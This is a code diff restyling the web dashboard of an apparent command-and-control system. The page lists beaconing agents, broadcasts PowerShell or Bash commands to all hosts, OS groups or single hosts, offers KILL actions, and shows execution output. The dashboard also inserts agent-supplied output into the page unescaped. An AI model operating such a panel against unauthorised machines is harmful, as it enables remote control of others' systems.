@@ -2,100 +2,97 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>C2_STRATEGIC_COMMAND_V2</title>
+    <title>C2 MISSION CONTROL // V3</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        :root { --accent: #00ff41; --bg: #050505; --card: #111; --text: #e0e0e0; }
-        body { background: var(--bg); color: var(--text); font-family: 'Consolas', monospace; overflow-x: hidden; }
-        .card { background: var(--card); border: 1px solid #222; border-radius: 4px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        .table { color: var(--text); vertical-align: middle; }
-        .terminal-box { background: #000; border: 1px solid #333; height: 350px; overflow-y: auto; padding: 15px; font-size: 0.85rem; }
-        .status-online { color: var(--accent); text-shadow: 0 0 8px var(--accent); }
-        .status-offline { color: #ff4444; opacity: 0.6; }
-        .text-neon { color: var(--accent); text-shadow: 0 0 10px var(--accent); font-weight: bold; letter-spacing: 2px; }
-        .badge-os { font-size: 0.65rem; padding: 3px 6px; font-weight: bold; text-transform: uppercase; border-radius: 3px; }
-        .row-hover:hover { background: #1a1a1a; cursor: pointer; }
-        .btn-action { font-size: 0.65rem; padding: 2px 8px; margin-right: 2px; border: 1px solid #444; background: transparent; color: #aaa; transition: 0.2s; }
-        .btn-action:hover { border-color: var(--accent); color: var(--accent); }
-        .btn-kill:hover { border-color: #ff4444; color: #ff4444; }
-        hr { border-color: #333; opacity: 1; }
-        pre { color: #00ff41; background: transparent; border: none; padding: 0; margin: 0; white-space: pre-wrap; }
+        :root { --accent: #00ff41; --bg: #0a0a0a; --card: #141414; --border: #252525; --text: #d0d0d0; }
+        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', Tahoma, sans-serif; padding: 2rem; }
+        
+        /* Grid Layout Fixes */
+        .dashboard-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 1.5rem; margin-bottom: 1.5rem; }
+        
+        .card { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; position: relative; }
+        .text-neon { color: var(--accent); text-shadow: 0 0 10px rgba(0, 255, 65, 0.3); font-weight: 800; text-transform: uppercase; }
+        
+        /* Header Fixes */
+        .header-stats { display: flex; gap: 1rem; align-items: center; }
+        .stat-badge { border: 1px solid var(--accent); padding: 0.4rem 1rem; font-size: 0.8rem; background: rgba(0, 255, 65, 0.05); }
+
+        /* Table Aesthetics */
+        .table { color: var(--text); border-color: var(--border); margin: 0; }
+        .table thead th { border-bottom: 2px solid var(--border); font-size: 0.7rem; color: #666; }
+        .table tbody td { border-bottom: 1px solid var(--border); padding: 12px 8px; vertical-align: middle; background: transparent !important; }
+        
+        /* Terminal / Feed */
+        .terminal-box { background: #000; border: 1px solid var(--border); height: 400px; overflow-y: auto; padding: 1rem; font-family: 'Consolas', monospace; }
+        pre { color: var(--accent); margin: 0; font-size: 0.85rem; line-height: 1.4; }
+        
+        /* Buttons */
+        .btn-action { background: transparent; border: 1px solid #444; color: #888; font-size: 0.65rem; padding: 4px 10px; border-radius: 4px; transition: all 0.2s; }
+        .btn-action:hover { border-color: var(--accent); color: var(--accent); background: rgba(0, 255, 65, 0.1); }
+        .btn-kill:hover { border-color: #ff4444 !important; color: #ff4444 !important; }
+        
+        /* Targeting Glow */
+        .target-selected { border-left: 3px solid var(--accent) !important; background: rgba(0, 255, 65, 0.02) !important; }
     </style>
 </head>
-<body class="p-4">
-    <div class="container-fluid">
-        <div class="row mb-4 align-items-center">
-            <div class="col-md-8"><h2 class="text-neon m-0">STRATEGIC_COMMAND // CORE_V2</h2></div>
-            <div class="col-md-4 text-end">
-                <span class="p-2 border border-success">SYSTEM_UPTIME: <span id="clock">00:00:00</span></span>
-                <span class="p-2 border border-success ms-2">BEACONS: <span id="agent-count">0</span></span>
-            </div>
+<body>
+
+    <div class="d-flex justify-content-between align-items-center mb-4">
+        <h2 class="text-neon m-0">Strategic Command // Core</h2>
+        <div class="header-stats">
+            <div class="stat-badge">NODES: <span id="agent-count">0</span></div>
+            <div class="stat-badge" id="clock">00:00:00</div>
+        </div>
+    </div>
+
+    <div class="dashboard-grid">
+        <div class="card">
+            <h6 class="text-muted small mb-3">ASSET_INVENTORY</h6>
+            <table class="table">
+                <thead>
+                    <tr><th>HOSTNAME</th><th>OS</th><th>LAST_BEACON</th><th>STATUS</th><th>ACTIONS</th></tr>
+                </thead>
+                <tbody id="agent-table"></tbody>
+            </table>
         </div>
 
-        <div class="row g-3">
-            <div class="col-lg-8">
-                <div class="card p-3 h-100">
-                    <h6 class="text-muted mb-3 text-uppercase small">Live Asset Inventory</h6>
-                    <div class="table-responsive">
-                        <table class="table">
-                            <thead>
-                                <tr class="text-muted" style="font-size: 0.7rem;">
-                                    <th>HOSTNAME</th><th>OS_PLATFORM</th><th>LAST_BEACON</th><th>STATUS</th><th>QUICK_ACTIONS</th>
-                                </tr>
-                            </thead>
-                            <tbody id="agent-table"></tbody>
-                        </table>
-                    </div>
-                </div>
+        <div class="card">
+            <div class="d-flex justify-content-between mb-3">
+                <h6 class="text-muted small">OPERATION_QUEUE</h6>
+                <span onclick="purgeQueue()" style="cursor:pointer; color:#ff4444; font-size: 0.6rem;">[CLEAR_ALL]</span>
             </div>
-
-            <div class="col-lg-4">
-                <div class="card p-3 h-100">
-                    <div class="d-flex justify-content-between">
-                        <h6 class="text-muted mb-3 text-uppercase small">Active Task Queue</h6>
-                        <a href="#" onclick="purgeQueue()" class="text-danger small text-decoration-none" style="font-size: 0.6rem;">[PURGE_ALL]</a>
-                    </div>
-                    <div id="queue-list" class="terminal-box"></div>
-                </div>
-            </div>
-
-            <div class="col-lg-12">
-                <div class="card p-4">
-                    <form id="cmd-form">
-                        <div class="row align-items-center">
-                            <div class="col-md-3">
-                                <label class="small text-muted mb-1">TARGET_SELECTION</label>
-                                <select name="target" id="target-select" class="form-select bg-dark text-white border-secondary">
-                                    <option value="ALL">BROADCAST_ALL</option>
-                                    <option value="BROADCAST_WINDOWS">GROUP_WINDOWS</option>
-                                    <option value="BROADCAST_LINUX">GROUP_LINUX</option>
-                                    <optgroup label="INDIVIDUAL_ASSETS" id="opt-assets"></optgroup>
-                                </select>
-                            </div>
-                            <div class="col-md-7">
-                                <label class="small text-muted mb-1">INSTRUCTION_STRING</label>
-                                <input type="text" name="command" id="cmd-input" class="form-control bg-dark text-white border-secondary" placeholder="Enter PowerShell or Bash command..." required>
-                            </div>
-                            <div class="col-md-2 pt-4">
-                                <button class="btn btn-outline-success w-100">TRANSMIT</button>
-                            </div>
-                        </div>
-                    </form>
-                </div>
-            </div>
-
-            <div class="col-lg-12">
-                <div class="card p-3 mt-2">
-                    <div class="d-flex justify-content-between align-items-center mb-3">
-                        <h6 class="text-muted m-0 small text-uppercase">Execution Output History</h6>
-                        <div class="d-flex gap-2">
-                            <input type="text" id="search-box" class="form-control form-control-sm bg-dark text-white border-secondary" placeholder="Filter output...">
-                        </div>
-                    </div>
-                    <div id="results-feed" class="terminal-box" style="height: 500px;"></div>
-                </div>
-            </div>
+            <div id="queue-list" class="terminal-box" style="height: 300px;"></div>
         </div>
+    </div>
+
+    <div class="card mb-4">
+        <h6 class="text-muted small mb-3">COMMAND_UPLINK</h6>
+        <form id="cmd-form">
+            <div class="row g-2">
+                <div class="col-md-3">
+                    <select name="target" id="target-select" class="form-select bg-dark text-white border-secondary">
+                        <option value="ALL">BROADCAST_ALL</option>
+                        <optgroup label="OS_GROUPS">
+                            <option value="BROADCAST_WINDOWS">WINDOWS_ALL</option>
+                            <option value="BROADCAST_LINUX">LINUX_ALL</option>
+                        </optgroup>
+                        <optgroup label="ASSETS" id="opt-assets"></optgroup>
+                    </select>
+                </div>
+                <div class="col-md-7">
+                    <input type="text" name="command" id="cmd-input" class="form-control bg-dark text-white border-secondary" placeholder="Awaiting manual instructions..." required>
+                </div>
+                <div class="col-md-2">
+                    <button class="btn btn-outline-success w-100">TRANSMIT</button>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <div class="card">
+        <h6 class="text-muted small mb-3">EXECUTION_LOGS</h6>
+        <div id="results-feed" class="terminal-box" style="height: 450px;"></div>
     </div>
 
     <script>
@@ -109,100 +106,69 @@
             updateDashboard();
         }
 
-        function setTarget(hostname) {
-            const selector = document.getElementById('target-select');
-            selector.value = hostname;
+        function selectAgent(hostname) {
+            document.getElementById('target-select').value = hostname;
             document.getElementById('cmd-input').focus();
+            updateDashboard(); // Refresh to show highlight
         }
 
         async function updateDashboard() {
             try {
                 const response = await fetch('/api/stats');
                 const data = await response.json();
-
-                document.getElementById('agent-count').innerText = data.total_count;
                 const table = document.getElementById('agent-table');
                 const optAssets = document.getElementById('opt-assets');
-                const savedTarget = document.getElementById('target-select').value;
+                const currentTarget = document.getElementById('target-select').value;
 
+                document.getElementById('agent-count').innerText = data.total_count;
                 table.innerHTML = ''; optAssets.innerHTML = '';
 
                 data.agents.forEach(agent => {
                     const isWin = agent.os.toLowerCase().includes("windows");
-                    const statusClass = agent.status === "ONLINE" ? "status-online" : "status-offline";
-                    const badgeClass = isWin ? "bg-primary" : "bg-warning text-dark";
-                    const osLabel = isWin ? "WINDOWS" : "LINUX";
-
+                    const isSelected = currentTarget === agent.hostname;
+                    
                     table.innerHTML += `
-                        <tr class="row-hover">
-                            <td onclick="setTarget('${agent.hostname}')"><strong class="text-info">${agent.hostname}</strong></td>
-                            <td><span class="badge-os ${badgeClass}">${osLabel}</span> <small class="text-muted">${agent.os}</small></td>
+                        <tr class="${isSelected ? 'target-selected' : ''}">
+                            <td onclick="selectAgent('${agent.hostname}')" style="cursor:pointer"><strong>${agent.hostname}</strong></td>
+                            <td><small class="text-muted">${agent.os}</small></td>
                             <td><small>${agent.last_seen}</small></td>
-                            <td class="${statusClass}">● ${agent.status}</td>
+                            <td style="color: ${agent.status === 'ONLINE' ? '#00ff41' : '#ff4444'}">● ${agent.status}</td>
                             <td>
                                 <button class="btn-action" onclick="triggerAction('${agent.hostname}', 'sysinfo')">INFO</button>
                                 <button class="btn-action" onclick="triggerAction('${agent.hostname}', 'netstat')">NET</button>
                                 <button class="btn-action btn-kill" onclick="triggerAction('${agent.hostname}', 'kill')">KILL</button>
                             </td>
                         </tr>`;
-                    
-                    optAssets.innerHTML += `<option value="${agent.hostname}">${agent.hostname} (${osLabel})</option>`;
+                    optAssets.innerHTML += `<option value="${agent.hostname}">${agent.hostname}</option>`;
                 });
-                
-                document.getElementById('target-select').value = savedTarget;
 
-                // Update Queue
+                // Render Queue and Results Feed (logic remains same but cleaner markup)
                 const qList = document.getElementById('queue-list');
-                qList.innerHTML = data.queue.length === 0 ? '<div class="text-muted text-center mt-5 small">NO_PENDING_OPERATIONS</div>' : '';
-                data.queue.forEach(task => {
-                    qList.innerHTML += `
-                        <div class="mb-2 border-bottom border-secondary pb-2">
-                            <span class="text-warning small" style="font-size: 0.6rem;">[TASKED]</span> <small class="text-info">${task.target}</small><br>
-                            <code>${task.command}</code><br>
-                            <span class="text-muted" style="font-size: 0.65rem;">ACK: ${task.seen_list.join(', ') || 'Waiting...'}</span>
-                        </div>`;
+                qList.innerHTML = data.queue.length === 0 ? '<div class="text-center mt-5 opacity-25 small">IDLE</div>' : '';
+                data.queue.forEach(t => {
+                    qList.innerHTML += `<div class="mb-2 small"><span class="text-warning">></span> ${t.target}: <span class="text-white">${t.command}</span></div>`;
                 });
 
-                // Update Feed
                 const resFeed = document.getElementById('results-feed');
                 data.results.forEach(res => {
                     if (!seenResultIds.has(res.id)) {
                         seenResultIds.add(res.id);
-                        const isWin = res.os && res.os.toLowerCase().includes("windows");
-                        const badgeClass = isWin ? "bg-primary" : "bg-warning text-dark";
                         const div = document.createElement('div');
-                        div.className = "feed-item mb-4 border-start border-success ps-3";
-                        div.innerHTML = `
-                            <div class="d-flex justify-content-between small text-muted mb-1">
-                                <span>[${res.timestamp}] <span class="badge badge-os ${badgeClass}">${isWin ? 'WINDOWS' : 'LINUX'}</span> <strong>${res.hostname}</strong></span>
-                            </div>
-                            <pre>${res.output}</pre>`;
+                        div.className = "mb-4 pb-2 border-bottom border-dark";
+                        div.innerHTML = `<small class="text-muted">[${res.timestamp}] ${res.hostname}</small><pre>${res.output}</pre>`;
                         resFeed.prepend(div);
                     }
                 });
-            } catch (e) { console.error("Poll Error", e); }
+            } catch (e) { console.error("Poll fail", e); }
         }
 
-        // Search Filter
-        document.getElementById('search-box').oninput = (e) => {
-            const val = e.target.value.toLowerCase();
-            document.querySelectorAll('.feed-item').forEach(item => {
-                item.style.display = item.innerText.toLowerCase().includes(val) ? "block" : "none";
-            });
-        };
-
-        // Clock implementation
-        setInterval(() => {
-            document.getElementById('clock').innerText = new Date().toLocaleTimeString();
-        }, 1000);
-
+        setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
         document.getElementById('cmd-form').onsubmit = async (e) => {
             e.preventDefault();
             await fetch('/admin/send_cmd', { method: 'POST', body: new FormData(e.target) });
             e.target.reset();
             updateDashboard();
         };
-
         setInterval(updateDashboard, 3000);
         updateDashboard();
     </script>
